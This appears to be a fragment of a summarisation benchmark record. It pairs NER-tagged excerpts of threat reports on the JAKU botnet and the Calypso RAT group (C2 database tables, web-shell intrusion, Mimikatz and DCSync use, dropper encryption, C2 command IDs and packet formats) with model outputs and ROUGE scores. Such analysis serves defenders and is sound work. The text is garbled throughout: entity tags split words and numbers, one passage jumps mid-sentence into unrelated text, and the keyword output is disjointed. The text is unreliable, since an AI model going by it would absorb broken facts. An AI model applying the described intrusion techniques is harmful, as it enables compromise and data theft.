TABLE dist2 ( i d INTEGER PRIMARY KEY , pubdownfile [ORG] TEXT , pubdownver REAL , pubdowncnt [ORG] INTEGER , pridownfile [ORG] TEXT , pridownver REAL , pridowncnt INTEGER);CREATE TABLE history ( i d INTEGER PRIMARY KEY , uid [PERSON] TEXT , ctime INTEGER);CREATE TABLE tvdist ( i d INTEGER PRIMARY KEY , tvdownfile TEXT , tvdownver REAL , tvdowncnt INTEGER);CREATE INDEX idx_instime ON child(instime);CREATE INDEX idx_lasttime [ORG] ON [ORG] child(lasttime);CREATE [ORG] INDEX idx_version ON child(version);TLP - WHITE | 36HISTORY Table . The history table contains a list of all beacons set by the malware on the victim machine to the [CARDINAL] C2 server : COLUMN DESCRIPTIONUIDA unique identifier of the victim . This matches the [ORG] UID in the CHILD tableCTIMEThe data / time of a beacon made from the victim machine to the [CARDINAL] C2 server . As with all the data / times in the SQLite database , the format is in \" UNIX Epoch \" format . Example query of HISTORY table:$ sqlite -column -header near.jpg \" SELECT * FROM HISTORY LIMIT 5;\"id uid ctime---------- -------------------------------------- ----------1 { 610313D3 - 6359 - 4543 - 8314 - 64E1DF6DBF20 } [DATE] 14301864732 { 610313D3 [DATE] - 6359 [DATE] - 4543 [DATE] - 8314 [DATE] - 64E1DF6DBF20 } [CARDINAL] 14301882423 { 12941DFB-6ECD-45CD - B7B2 - 9C0F8F16DF6F } [DATE] 14303596484 { 66CEAD40 [CARDINAL] - 85D9 [CARDINAL] - 4AA8 [CARDINAL] - 9B59 [CARDINAL] - 3DF9E079FA69 } [DATE] 14304438965 { 211E31DB - C944 - 4C66 - A91C-7C7BDF7CE5EF } 1430447441 $ sqlite -column -header near.jpg ' SELECT STRFTIME(\"%Y-%m-%d % H:%M:%S\",CTIME,\"UNIXEPOCH \" ) AS\"DATE / TIME \" FROM HISTORY WHERE UID=\"{211E31DB - C944 - 4C66 - A91C-7C7BDF7CE5EF}\"DATE / TIME-------------------2015 - 05 - 01 02:30:412015 - 05 - 01 06:30:342015 - 05 - 01 07:04:072015 - 05 - 01 07:30:342015 - 05 - 01 08:30:352015 - 05 - 01 09:00:352015 - 05 - 01 09:30:352015 - 05 - 01 10:00:352015 - 05 - 01 10:31:552015 - 05 - 01 11:01:162015 - 05 - 01 11:30:362015 - 05 - 01 12:00:352015 - 05 - 01 12:30:342015 - 05 - 01 13:00:392015 - 05 - 01 13:30:342015 - 05 - 01 14:00:352015 - 05 - 01 14:30:342015 - 05 - 04 13:30:402015 - 05 - 04 14:00:392015 - 05 - 04 14:30:392015 - 05 - 04 [CARDINAL] 15:00:38TLP - WHITE | 37CHILD Table . Analysis has shown that the table CHILD is information that relates to victim hosts : COLUMNDESCRIPTIONUIDA unique identifier of the victim . This allows the [CARDINAL] C2 server to track victims if and when their [ORG] IP address changes . VERSIONBelieved to be the version of the malware on the victim machine . PIPThe public IP address of the victim . This is updated as and when the victim machines external [ORG] IP address changes . INFOThe details gathered by the malware from the victim machine ( See below).INFOUPTIMEThe date / time that the [ORG] INFO field was updated in the database . Believed to be the date / time on the [CARDINAL] C2 throws greater insight on the [ORG] JAKU campaign , while much of it , sadly , does not . Occasionally , when \u2018 pivoting \u2019 off already collected data , strange and unusual things are found ; for example , learning that [GPE] Shokushu is [NORP] Japanese for tentacle . Unfortunately , time is sometimes not available to allow for the \u201c so what ? \u201d questions to be answered fully . [CARDINAL] One example is the following script which was found at the URL : hxxp://bestshop.minidns.net/test/ccdown/ping.bat . Although dating back to [DATE] November [DATE] 2014 , it is still noteworthy because of a number of curiosity reasons . [CARDINAL] One example is : \u201c Why \u2018 ping \u2019 after doing the \u2018 traceroute\u2019?\u201dThe remaining reasons are left as an exercise to the reader . However , this is not the Easter - egg you are because we had discovered a number of Star Wars references made by the threat actors within their malware . This included R2D2 . Because we had no wish to face any copyright issues , we spelt it as JAKU.However , as we embarked on our investigation we found out more about JAKU . We realised that this thing had reached every corner of the world . As we continued , it began to emerge that this beast had a centre of gravity somewhere in [LOC] the [LOC] Gulf [LOC] of [LOC] Thailand and a predilection for attacking [GPE] Japan and [GPE] South [GPE] Korea . As an unashamed fan [NORP] Japanese monster movies , anime , manga and [PERSON] DJ [PERSON] Krush , and with more than a passing interest in Lovecraft [ORG] \u2019s [ORG] Cthulhu mythos , it was clear ( to me at least ) that JAKU should be represented as a tentacle wielding sea monster rising from ocean to grab its next set of victims . This fitted well with our observation of the noticeable amount of pirated anime movies on the victim machines , downloaded from sites \u2018 baited \u2019 with malware to catch the next unsuspecting victims . [PERSON] Andy [PERSON] Settle Head of Special Investigations , Forcepoint Security LabsTLP - WHITE | [CARDINAL] 43REFERENCES\uf0b7 Coding and Security , Glorious Leader 's Not - That- Glorious Malwares - Part [CARDINAL] 2 ( Jan 2015 ) , Available from : < url Leaders - Not - That - Glorious - Malwares - Part-2 > . [ Dec 2015]\uf0b7 [PERSON] Schneier [PERSON] Bruce , DarkHotel ( Nov [DATE] 2014 ) , [PERSON] Availablefrom : < url phisticated_t.html > . [ Sep 2015].\uf0b7 CNET , ' [ORG] Darkhotel ' hack targets executives using hotelInternet ( Nov [DATE] 2014 ) , Available from : < url executives - using - hotel - internet/ > . [ Oct [CARDINAL] 2015].\uf0b7 [ORG] FBI , [ORG] Malware [ORG] Installed on Travelers ' [ORG] Laptops [ORG] Through [ORG] Software [ORG] Updates on [ORG] Hotel [ORG] Internet [ORG] Connections ( Nov [ORG] 2014 ) , Available from : < url [ Oct 2015].\uf0b7 Fluke Networks , DarkHotel : What Hospitality WLAN Operators Should Know ( Nov [DATE] 2014 ) , Available from : < url -what - hospitality - wlan - operators - should - know > . [ [ORG] Oct [ORG] 2015].\uf0b7IANA [ORG] Number [ORG] Resources , < url [ April 2015].\uf0b7 Kaspersky , [PERSON] Admin [PERSON] Alert : [PERSON] Kaspersky [PERSON] Lab [PERSON] ReportedTwice as Many Digital Certificates Used to Sign Malware in [DATE] 2014 ( [DATE] Jan [DATE] 2015 ) , Available from : < url dmin - Alert - Kaspersky - Lab - Reported - Twice - as - Many- Digital [ORG] - Certificates [ORG] - Used [ORG] - [ORG] to [ORG] - Sign [ORG] - [ORG] Malware [ORG] - in-2014 > . [ Oct 2015].\uf0b7 Kaspersky , [ORG] DarkHotel 's attacks in [DATE] 2015 ( [PERSON] Jul 2015),Available from : < url s - attacks - in-2015/ > . [ Oct 2015].\uf0b7 Kaspersky , DarkHotel : a spy campaign in luxuryAsian hotels ( Nov [DATE] 2014 ) , Available from : < url [ Sep 2015].\uf0b7 Kaspersky , [PERSON] Whitepaper [PERSON] DarkHotel ( Nov 21014),Available from:<url 11.pdf > . [ Sep 2015].\uf0b7 Kaspersky , Who \u2019s Really Spreading through theBright Star ? ( Apr [DATE] 2015 ) , Available from : < url spreading - through - the - bright - star/ > . [ Dec 2015].\uf0b7 Secure File Shredder ( Oct 2008 ) , Available from:<url File - Shredder > . [ April 2016].\uf0b7 Sophos , What the [ORG] FBI did n\u2019t tell us about the hotelmalware threat | Naked Security ( [DATE] May [DATE] 2012 ) , Available from : < url hotel - malware - threat > . [ Dec 2015].\uf0b7 [PERSON] Tamatori fighting an octopus , Available from:<url a_Tamatori_attacked_by_the_octopus.jpg > , [ [DATE] April [DATE] 2016].\uf0b7 [ORG] UK [ORG] CERT , SAWR 044 Extract ( [DATE] Dec [DATE] 2014 ) , [PERSON] Availablefrom : < url content / uploads/2014/12 / C - SAWR-044 - Extract.pdf > . [ Dec 2015].\uf0b7 Unlicensed Software and [ORG] Cybersecurity Threats(January [DATE] 2015 ) , Available from : < url are_en.pdf > . [ April 2015].\uf0b7 WIRED , [ORG] DarkHotel : A Sophisticated New HackingAttack Targets High - Profile Hotel Guests ( Nov [DATE] 2014 ) , Available from : < url [ Sep 2015].\uf0b7 UDT : Breaking [ORG] the [ORG] Data [ORG] Transfer [ORG] Bottleneck ( 2011),Available from : < url [ Dec 2015].\uf0b7LZH - Compression / Decompression using lzh / lzhuff ( [DATE] Jan [DATE] 2015 ) , Available from : < url > . [ Oct 2015].TLP - WHITE | [CARDINAL] 44", "generated_text": "a botnet campaign; Forcepoint Security Labs; a group; individuals; NGOs; engineers; academics; government employees; a small number; organizations; JAKU; TTPs; infrastructure; tools; techniques; processes; victims; tactics; details; the operation; five; C2 servers; location; data; the group; the use; Compromise; IP addresses; Attacker Settings; Sets; time; regions; countries; activity; JAKU victims; APT; the victims; the deployment; the use; network; a variety; country; a variety; language; code; case; execution; a variety; indicators; compromise; the campaign; the findings; the attackers; the nature; the targeted attacks.", "ref_text": "<START-1>The document analyzes an ongoing botnet campaign called JAKU investigated by Forcepoint. JAKU involves both indiscriminate targeting of thousands of victims as well as precision targeting of specific individuals related to North Korea. Technical analysis reveals a multi-stage infection process involving poisoned BitTorrent files and fake image files containing malware. The malware communicates with command and control (C&C) servers via encrypted protocols. It gathers system information and can execute commands from the attacker. The C&C servers store victim data in SQLite databases. Analysis of the data shows victims are predominantly in South Korea, Japan, and China. Many appear to be running counterfeit Windows installs and pirated software. The malware uses resilient, custom communication channels including DNS, TCP, UDP, and UDT protocols. It employs evasion techniques like process injection and deletion to avoid detection. The malware continues to be actively developed. The report documents the infection process, capabilities, infrastructure, victimology, and attribution clues uncovered during the JAKU investigation. It aims to provide insights into the inner workings of botnets and modern cybercrime campaigns. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3717277486910995, "gpt3/lexical/rouge_rouge2": 0.08947368421052633, "gpt3/lexical/rouge_rougeL": 0.20418848167539266, "gpt3/lexical/rouge_rougeLsum": 0.20418848167539266, "gpt3_generated_text": ["The article discusses the JAKU botnet campaign, investigated by the Forcepoint Special Investigations team. The campaign reveals insights into the inner workings of a botnet and sheds light on the vulnerabilities and targeting of its victims. The JAKU campaign demonstrates the reuse of infrastructure, tools, techniques, and processes (TTPs) and the herding of victims into separate groups, both indiscriminate and highly targeted. The campaign involves concurrent operations, herding thousands of victims into becoming botnet members while also executing targeted attacks on a small number of individuals. The targeted attacks focus on individuals from various nationalities, including NGOs, engineering companies, academics, scientists, and government employees, with a common theme of North Korea. The report provides technical details of the \"RED-RACOON\" operation, while the sensitive information has been shared with law enforcement and government agencies. The study highlights the consequences of disregarding copyrights and digital rights, leading to end-point security vulnerabilities and potential information and identity theft by botnet controllers. Botnets are resilient and pervasive attack infrastructures used by organized crime and rogue states, with the herding of victims into smaller bot-networks enhancing their resilience. The article emphasizes the deployment and tactics of the JAKU campaign and the findings regarding the nature of the targeted attacks."]}, {"split_name": "val", "sample_id": "val_100", "prompt_text": "Extract the keywords: [DATE] March [DATE] 2019 during threat hunting . Our specialists collected multiple samples of malware used by the group . They have also identified the organizations hit by the attackers , as well as the attackers ' C2 servers . Our data indicates that the group has been active since [DATE] at [DATE] least [DATE] September [DATE] 2016 . The primary goal of the group is theft of confidential data . [ORG] Main targets are governmental institu- tions in [GPE] Brazil , [GPE] India , [GPE] Kazakhstan , [GPE] Russia , [GPE] Thailand , and [GPE] Turkey . Our data gives reason to believe that the [ORG] APT group is of [NORP] Asian origin.11.See the section \" Attribution . \"2Initial infection vectorThe attackers accessed the internal network of a compromised organization by using an ASPX web shell . They uploaded the web shell by exploiting a vulnerability or , alternately , guessing default credentials for remote access . We managed to obtain live traffic between the attackers domain tv.teldcomtv.com , the [CARDINAL] C2 server for the group 's trojan . Therefore the hackers use [CARDINAL] C2 servers not only to control malware , but also to access hosts on compromised infrastructures . The attackers used the web shell to upload utilities1 and malware,2 execute commands , and dis- tribute malware inside the network . Examples of commands from the traffic are demonstrated in the following screenshot . Figure [CARDINAL] 2 . [ORG] Commands sent to the web shell1.2.See the section \" Lateral movement . \"See the section \" Analyzing Calypso RAT malicious code . \"3Lateral movementThe group performed lateral movement by using the following publicly available utilities and [ORG] TCP [ORG] Port [ORG] Scanner EternalRomanceOn compromised computers , the group stored malware and utilities in either C:\\RECYCLER or C:\\ProgramData . The [ORDINAL] first option was used only on computers with Windows XP or Windows Server 2003 with NTFS on drive C.The attackers spread within the network either by exploiting vulnerability MS17 - 010 or by using stolen credentials . In [CARDINAL] one instance , [DATE] 13 [DATE] days after the attackers got inside the network , they used [ORG] DCSync and [PERSON] Mimikatz to obtain the [ORG] Kerberos ticket of the domain administrator , \" passing the ticket \" to infect more computers . Figure [CARDINAL] 3 . Obtaining account data via DCSyncUse of such utilities is common for many [ORG] APT groups . Most of those utilities are legitimate ones used by network administrators . This allows the attackers to stay undetected longer . [ORG] AttributionIn [ORG] one attack , the group used Calypso RAT , PlugX , and the [PERSON] Byeby trojan . Calypso RAT is malware unique to the group and will be analyzed in detail in the text that follows . PlugX has traditionally been used by many [ORG] APT groups of [NORP] Asian origin . Use of PlugX in itself does not point to any particular group , but is overall consistent with an [NORP] Asian origin . [WORK_OF_ART] The [WORK_OF_ART] Byeby [WORK_OF_ART] trojan1 was used in the SongXY malware campaign back in [DATE] 2017 . The version used now is modified from the original . The group involved in the original campaign is also of [NORP] Asian origin . It performed targeted attacks on defense and government - related targets in [GPE] Russia and the [ORG] CIS countries . However , we did not find any clear - cut connection between the [CARDINAL] two campaigns . When we analyzed the traffic between the attackers ' server and the web shell , we found that the attackers used a non - anonymous proxy server . [ORG] The X - Forwarded - For header passed the attackers ' in a chain of proxy servers).1.unit42.paloaltonetworks.com / unit42 - threat - actors - target - government - belarus - using - cmstar - trojan/4Figure [CARDINAL] 4 . Headers of requests to the web shellThe IP address belongs to [GPE] China Telecom . We believe the attackers could have been careless and set up the proxy server incorrectly , thus disclosing their real IP address . This is the [ORDINAL] first piece of evidence supporting the [NORP] Asian origins of the group . Figure [CARDINAL] 5 . Information on the discovered [ORG] IP addressThe attackers also left behind a number of system artifacts , plus traces in utility configurations and auxiliary scripts . These are also indicative of the group 's origin . For instance , [CARDINAL] one of the [ORG] DoublePulsar configuration files contained external [ORG] IP address addresses . Figure [CARDINAL] 6 . IP address found in the [ORG] DoublePulsar configurationThis [ORG] IP address belongs to a [NORP] Chinese provider , like the one before , and it was most likely left there due to the attackers ' carelessness . This constitutes additional evidence of the group 's [NORP] Asian origins . Figure [CARDINAL] 7 . Information on the discovered [ORG] IP address5We also found [PERSON] BAT scripts that launched [ORG] ZXPortMap and [PERSON] EarthWorm for port forwarding . Inside PlugX malware we found on the compromised system . As already mentioned , PlugX is tradition- ally used by groups of [NORP] Asian origin , which constitutes yet more evidence . Therefore we can say that the malware and network infrastructure used all point to the group having an [NORP] Asian origin . Analyzing Calypso RAT malicious codeThe structure of the malware and the process of installing it on the hosts of a compromised net- work look as follows : Figure [CARDINAL] 9 . Malware structure and installation processDropperThe dropper extracts the payload as an installation [ORG] BAT script and [ORG] CAB archive , and saves it to disk . The payload inside the dropper has a magic header that the dropper searches for . The fol- lowing figure shows an example of the payload structure.6Figure [CARDINAL] 10 . Structure of the payload hard - coded in the dropperThe dropper encrypts and decrypts data with a self - developed algorithm that uses CRC32 as a pseudorandom number generator ( PRNG ) . The algorithm performs arithmetic ( addition and subtraction ) between the generated data and the data that needs to be encrypted or decrypted . Figure [CARDINAL] 11 . Dropper with original encryption and decryption algorithmNow decrypted , the payload is saved to disk at % ALLUSERSPROFILE;\\TMP_%d%d , where the last [CARDINAL] two numbers are replaced by random numbers returned by the rand ( ) function . Depending on the configuration , the [ORG] CAB archive contains [CARDINAL] one of [CARDINAL] three possibilities : a [ORG] DLL and encrypted shellcode , a [ORG] DLL with encoded loader in the resources , or an [ORG] EXE file . We were unable to detect any instances of the last variant . Installation [PERSON] BAT scriptThe [PERSON] BAT script is encoded by substitution from a preset dictionary of characters ; this dictionary is initialized in a variable in the installation script . Figure [CARDINAL] 12 . Example of installation script obfuscationIn the decoded script , we can see comments hinting at the main functions of the script:\u008f [PERSON] \u008fREM [PERSON] Goto temp directory & extract file ( go to TEMP directory and extract files there ) [PERSON] REM [PERSON] Uninstall old version ( uninstall the old version ) [PERSON] REM [PERSON] Copy file ( copy file ) [PERSON] REM [PERSON] Run pre - install script ( run the installation [ORG] BAT script ) [PERSON] REM [PERSON] Create service ( create a service launching the malware at system startup ) [PERSON] REM [PERSON] Create [PERSON] Registry [PERSON] Run ( create value in the registry branch for autostart)7At the beginning of each script we can see a set of variables . The script uses these variables to save files , modify services , and modify registry keys . Figure [CARDINAL] 13 . Initializing variables in deobfuscated scriptIn one of the oldest samples , compiled in [DATE] 2016 , we found a script containing comments for how to configure each variable . Figure [CARDINAL] 14 . Early version of the script with comments8Shellcode x86 : stagerIn most of the analyzed samples , the dropper was configured to execute shellcode . The dropper saved the [ORG] DLL and encrypted shellcode to disk . The shellcode name was always identical to that of the [ORG] DLL , but had the extension .dll.crt . The shellcode is encrypted with the same algorithm as the payload in the dropper . The shellcode acts as a stager providing the interface for communi- cating with C2 and for downloading modules . It can communicate with C2 via [ORG] TCP and [ORG] SSL . [ORG] SSL is implemented via the mbed_tls library . Initial analysis of the shellcode revealed that , in addition to dynamically searching for API func- tions , it runs [CARDINAL] one more operation that repeats the process of [ORG] PE file address relocation . The structure of the relocation table is also identical to that found in the [ORG] PE file . Figure [CARDINAL] 15 . Shellcode relocationsSince the process of shellcode address relocation repeats that of the [ORG] PE file , we can assume that initially the malware is compiled into a [ORG] PE file , and then the builder turns it into shellcode . Debugging information found inside the shellcode supports that assumption . Figure [CARDINAL] 16 . Debugging information inside the shellcodeAPI functions are searched for dynamically and addresses are relocated , after which the config- uration hard - coded inside the shellcode is parsed . The configuration contains information about the [CARDINAL] C2 server address , protocol used , and connection type . Figure [CARDINAL] 17 . Example of shellcode configurationNext the shellcode creates a connection to C2 . A random packet header is created and sent to C2 . In response the malware receives a network key , saves it , and then uses it every time when com- municating with C2 . Then the information about the infected computer is collected and sent to [CARDINAL] C2.Next [CARDINAL] three threads are launched . [CARDINAL] One is a heartbeat sending an empty packet to [TIME] C2 [TIME] every [TIME] 54 [TIME] seconds . The other processes and executes commands from [CARDINAL] C2 . As for the [ORDINAL] third thread , we could not figure out its purpose , because the lines implementing its functionality were removed from the code . All we can tell is that this thread was supposed to \" wake up \" [TIME] every [TIME] 54 [TIME] seconds , just like the [ORDINAL] first one.9ModulesWe have not found any modules so far . But we can understand their functionality by analyzing the code responsible for communication between the shellcode and the modules . Each module is shellcode which is given control over the [CARDINAL] zero offset of the address . Each module exists in its own separate container . The container is a process with loaded module inside . By default , the process is svchost.exe . When a container is created , it is injected with a small shellcode that caus- es endless sleep . This is also hard - coded in the main shellcode , and more specifically in [ORG] JustWait . pdb , most likely . The module is placed inside with an ordinary writeprocess and is launched either with [ORG] NtCreateThreadEx or , on pre - Vista operating systems , CreateRemoteThread . [CARDINAL] Two pipes are created for each module . [CARDINAL] One is for transmitting the data from the module to [CARDINAL] C2 ; the other for receiving data from C2 . Quite likely the modules do not have their own network code and instead use the pipes to communicate with external C2 through the main shellcode . Figure [CARDINAL] 18 . Creating pipes for modulesEach module has a unique ID assigned by [CARDINAL] C2 . Containers are launched in different ways . A con- tainer can be launched in a specific session open in the OS or in the same session as the stager . In any particular session , the container is launched by getting the handle for the session token of a logged - in user , and then launching the process as that user.10Figure [CARDINAL] 19 . Creating container process in a different sessionCommandsThe malware we studied can process [CARDINAL] 12 commands . All of them involve modules in [CARDINAL] one way or another . Here is a list of all IDs of commands found in the malware , along with those that the mal- ware itself sends in various situations . IDDirectionTypeDescription0x401From \u04212Command0x402From \u04212CommandCreate module descriptor . This command contains information on the module size and ID . It also allo- cates memory for the module data . The command is likely the [ORDINAL] first in the chain of commands used for loading a moduleAccept module data , and if all data is accepted , launch the module inside a container running in the same session as the stager0x403From [CARDINAL] \u04212CommandSame [CARDINAL] as [CARDINAL] 0x402 , but the module is launched in a container running in a different session0x404From C2CommandWrite data to pipe for module launched inside a con- tainer running in the same session as the stager0x405From \u04212CommandWrite data to pipe for module launched inside a container in a different session0x409From [GPE] \u04212Command0\u0445201From \u04212CommandGenerate a constant by calling GetTickCount ( ) and save it . This constant is used in the [ORDINAL] third thread , mentioned already , whose purpose we were unable to discernLaunch the module if the buffer size stored in the module descriptor equals the module size . Does not accept data ( unlike commands 0\u0445402 and 0\u0445403 ) . The module is launched inside a container running in the same session as the stager110\u0445202From \u04212CommandSame as 0x201 , but the module is launched in a con- tainer running in a different session0\u0445203From \u04212CommandClose all pipes related to a specific module running inside a container launched in the same session as the stager0\u0445204From \u04212CommandSame as 0x203 , but for a module running in a con- tainer launched in a different session0x206From \u04212CommandCollect information on sessions open in the system ( such as session IDs and computer names ) and send it to C20\u0445207From \u04212CommandAssign session ID . This ID will be used to launch con- tainers in this session0x4090x1030x302From the malwareResponseID used in empty heartbeat packets ( the [ORDINAL] first thread described earlier)ResponseID of packet containing information on the infected computerResponseID of packet sent after an accepted session ID is saved ( command 0x207)0\u0445304From the malwareResponseID of packet sent after module is successfully placed inside a container . This code is sent after the module is launched in a different session0\u04453030x4060x4070x308From the [CARDINAL] malwareResponseSame [CARDINAL] as [CARDINAL] 0x304 , but the module is launched in the same session as the stagerResponseID of packet containing data piped by module in a container launched in the same session as the stagerResponseSimilar to [CARDINAL] 0x406 , but from a module launched in a different sessionResponseID of packet sent if no handle of a logged - in user 's session token could be obtained0x408From the malwareResponseID of packet sent if session - related information could not be obtained . Before the packet is sent , the shellcode checks the OS version . If the version is earlier than [ORG] Vista , data is regarded as impossible to obtain in the manner implemented in the malware , because the Windows API functions it uses are pres- ent only in [GPE] Vista and later.12Network codeNetwork communication is initialized after the network key is received from [CARDINAL] C2 . To do that , the malware sends a random sequence of [CARDINAL] 12 bytes to C2 . In response the malware also expects [CARDINAL] 12 bytes , the [CARDINAL] zero offset of which must contain the same value ( _ DWORD ) as prior to sending . If the check is successful , [CARDINAL] four bytes at offset [CARDINAL] 8 are taken from the response and decrypted with RC4 . The key is [CARDINAL] four bytes sent previously , also located at offset [CARDINAL] 8 . This result is the network key . The key is saved and then used to send data . All transmitted packets have the following structure.struct Packet { _ DWORD key ; _ WORD cmdId ; _ [ORG] WORD [ORG] szPacketPayload ; _ DWORD moduleId ; _ BYTE [ max 0xF000 ] packetPayload;};A random [QUANTITY] four - byte key is generated for each packet . It is later used to encrypt part of the header , starting with the cmdld field . The same key is used to encrypt the packet payload . Encryption uses the RC4 algorithm . The key itself is encrypted by [WORK_OF_ART] XOR with the network key and saved to the corresponding field of the packet header . [PERSON] Shellcode x64 : stager ( base backdoor)This shellcode is very similar to the previous one , but it deserves a separate description because of differences in its network code and method of launching modules . This shellcode has basic functions for file system interaction which are not available in the shellcode described earlier . Also the configuration format , network code , and network addresses used as C2 by this shellcode are similar to code from a [DATE] 2018 blog post by [ORG] NCC [ORG] Group about a Gh0st RAT variant . However , we did not find a connection to Gh0st RAT.This variant of the shellcode has [CARDINAL] only [CARDINAL] one communication channel , via SSL . The shellcode imple- ments it with [CARDINAL] two legitimate libraries , libeay32.dll and [ORG] ssleay32.dll , hard - coded in the shellcode itself . [ORDINAL] First the shellcode performs a dynamic search for API functions and loads [ORG] SSL libraries . The libraries are not saved to disk ; they are read from the shellcode and mapped into memory . Next the malware searches the mapped image for the functions it needs to operate . Then it parses the configuration string , which is also hard - coded in the shellcode . The configura- tion includes information on addresses of [CARDINAL] C2 servers and schedule for malware operation . Days of the weekFigure [CARDINAL] 20 . Sample of configuration string1.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/ decoding - network - data - from - a - gh0st - rat - variant/13After that the malware starts its main operating cycle . It checks if the current time matches the malware operational time . If not , the malware sleeps for [TIME] about [TIME] 7 [TIME] minutes and checks again . This happens until the current time is the operational time , and only then does the malware resume operation . Figure [CARDINAL] 20 demonstrates an example in which the malware remains active at all times on all days of the week . When the operational time comes , the malware goes down the list of [CARDINAL] C2 servers specified in the configuration and tries to connect . The malware subsequently interacts with whichever of the [CARDINAL] C2 servers it is able to successfully connect to first . Then the malware sends the information on the infected computer ( such as computer name , current date , OS version , [CARDINAL] 32 - bit vs. [CARDINAL] 64 - bit OS and CPU , and [ORG] IP addresses on network interfaces and their [ORG] MAC addresses ) . After the information on the infected computer is sent , the malware expects a response from C2 . If C2 returns the relevant code , sending is deemed successful and the malware proceeds . If not , the malware goes back to sequentially checking C2 addresses . Next it starts processing incoming commands from C2.ModulesEach module is a valid [ORG] MZPE file mapped in the address space of the same process as the shell- code . Also the module can export the GetClassObject symbol , which receives control when run ( if required).Each module has its own descriptor created by a command from C2 . The [CARDINAL] C2 server sends a byte array ( [CARDINAL] 0x15 ) describing the module . The array contains information on the module : whether the module needs to be launched via export , module type ( in other words , whether it needs pipes for communicating with C2 ) , module size , entry point [ORG] RVA ( used if there is no flag for launching via export ) , and module data decryption key . The key is , by and large , the data used to format the actual key . Figure [CARDINAL] 21 . Module decryptionWe should also point out that decryption takes place only if modKey is not equal to the 7AC9h constant hard - coded in the shellcode . This check affects only the decryption process . If modKey does equal the constant , the malware will immediately start loading the module . This means the module is not encrypted.14Each module is launched in a separate thread created specially for that purpose . Launching with pipes looks as follows:\u008f\u008f\u008f\u008fThe malware creates a thread for the module , starts mapping the module , and gives it con- trol inside the newly created thread . The malware creates a new connection to the current working C2.The malware creates a pipe with the name derived from the following format string : \\\\.\\ pipe\\windows@#%02XMon ( % 02X is replaced by a value that is received from \u04212 at the same time as the command for launching the module).The malware launches [CARDINAL] two threads passing data from the pipe to C2 and vice versa , using the connection created during the previous step . [CARDINAL] Two more pipes , \\\\.\\pipe\\win- dows@#%02Xfir and [CARDINAL] \\\\.\\pipe\\windows@#%02Xsec , are created inside the threads . The pipe ending in \" fir \" is used to pass data from the module to [CARDINAL] C2 . The pipe ending in \" sec \" is used to pass data and commands from [CARDINAL] C2 to the modules . The [ORDINAL] second thread processing the commands from [CARDINAL] C2 to the modules has its own handler . This is described in more details in the [ORG] Commands section . For now we can only say that one of the commands can start a local asynchronous TCP server . That server will accept data from whoever finds available , starting from [CARDINAL] 5000 and trying possible ports [CARDINAL] one by [CARDINAL] one . Commands The following is a list of IDs for commands the malware can receive , along with commands the malware itself sends in various situations . IDDirectionTypeDescription0x294CFrom \u04212CommandCreate module descriptor0x2AC8From \u04212CommandReceive data containing the module , and save it0x230EFrom \u04212CommandLaunch module without creating additional pipes0x2D06From \u04212Command [PERSON] Destroy module descriptor object0x590AFrom \u04212CommandLaunch built - in module for file system access0x3099From \u04212CommandLaunch module and create additional pipes for communication0x1C1CFrom \u04212CommandSelf - removal : run a [ORG] BAT script removing persistence and clearing the created directories0x55C3From \u04212CommandUpload file from computer to C20x55C5From \u04212CommandList directories recursively150x55C7From \u04212Command [PERSON] Download file from C2 to computer0x3167From \u04212Command Write data to pipe ending in \" Mon\"0x38AFFrom \u04212CommandWrite command 0x38AF to pipe ending in \" Mon \" . After that , end the open connection for the module . Possibly means \" complete module operation\"0x3716From \u04212CommandSend module data to a different module0x3A0BFrom \u04212CommandSame as 0x30990x3CD0From \u04212CommandStart an asynchronous TCP server to shuttle data between C2 and connected client0x129EFrom the malwareResponseID of a packet containing information about the computer0x132AFrom \u04212ResponseID of the packet sent by [CARDINAL] C2 in response to information sent regarding the infected computer . The malware treats receipt of this packet as confirming successful receipt of such information0x155BFrom the malwareResponseID of the packet containing information regarding the initialized module descriptors . The packet acts as \" [ORG] GetCommand \" . Response to this packet contains one of the supported commands0x2873From the malwareResponseID of the packet that is sent if a module descriptor has been initialized successfully ( [CARDINAL] 0x294c)0x2D06From the malwareResponseID of the packet that is sent if an error has occurred during module descriptor initialization ( 0x294c)0x2873From the malwareResponsethe packet that is sent after module data has been received ( 0x2AC8 ) . Contains the amount of bytes already saved0x2743From the malwareResponseID of the packet that is sent after a module is launched without pipes ( 0x230E)160x2D06From the malwareResponseID of the packet that is sent after a module descriptor has been destroyed ( 0x2D06)0x3F15From the malwareResponseID of the packet that is sent after a module is launched with pipes0x32E0From the malwareResponseID of the packet that is sent if there has been an attempt to reinitialize the pipes already created for a module0x34A7From the malwareResponseID of the packet containing the data sent from the pipe to C20x9F37From the malwareResponseID of the packet containing the data forwarded from the [ORG] TCP server to C2Network codeEach packet has the following structure : Struct Packet{Struct Header { _ [ORG] DWORD rand _ k1 ; _ [ORG] DWORD rand _ k2 ; _ [ORG] DWORD rand _ k3 ; _ DWORD [ORG] szPaylaod ; _ DWORD protoConst ; _ DWORD packetId ; _ [ORG] DWORD unk1 ; _ DWORD packetKey ; } ; } ; _ BYTE [ max [CARDINAL] 0x2000 ] [GPE] packetPayload;Each packet has a unique key calculated as szPayload + GetTickCount ( ) % hardcodedConst . This key is saved in the corresponding packetKey header field . It is used to generate another key for encrypting the packet header with RC4 ( encryption will not occur without the packetKey field ) . RC4 key generation is demonstrated in the following figure.17Figure [CARDINAL] 22 . Generating RC4 key for the headerThen yet another RC4 key is generated from the encrypted fields [PERSON] szPayload , packetId , proto- [ORG] Const , and rand_k3 . This key is used to encrypt the packet payload . Figure [CARDINAL] 23 . Generating RC4 key for the packet payload18Next the shellcode forms the HTTP headers and the created packet is sent to C2 . In addition , each packet gets its own number , indicated in the URL . [PERSON] Modules may pass their ID , which is used to look up the connection established during module launch . [PERSON] Module ID 0 is reserved for the main connection of the stager . Figure [CARDINAL] 24 . Forming HTTP headersOther optionsAs we noted , the dropper may be configured to launch not just shellcode , but executable files too . We found the same dropper - stager but with different payloads : Hussar and [ORG] FlyingDutchman . Dropper - stagerThe main tasks of this dropper are unpacking and mapping the payload , which is encoded and stored in resources . The dropper also stores encoded configuration data and passes it as a parameter to the payload . Figure [CARDINAL] 25 . Unpacking the [ORG] payload19HussarIn essence [PERSON] Hussar is similar to the shellcodes described earlier . It allows loading modules and collecting basic information about the computer . It can also add itself to the list of authorized applications in [FAC] Windows [FAC] Firewall . [PERSON] InitializationTo start , the malware parses the configuration provided to it by the loader . Figure [CARDINAL] 26 . Configuration sampleConfiguration structure is as follows : [PERSON] Struct 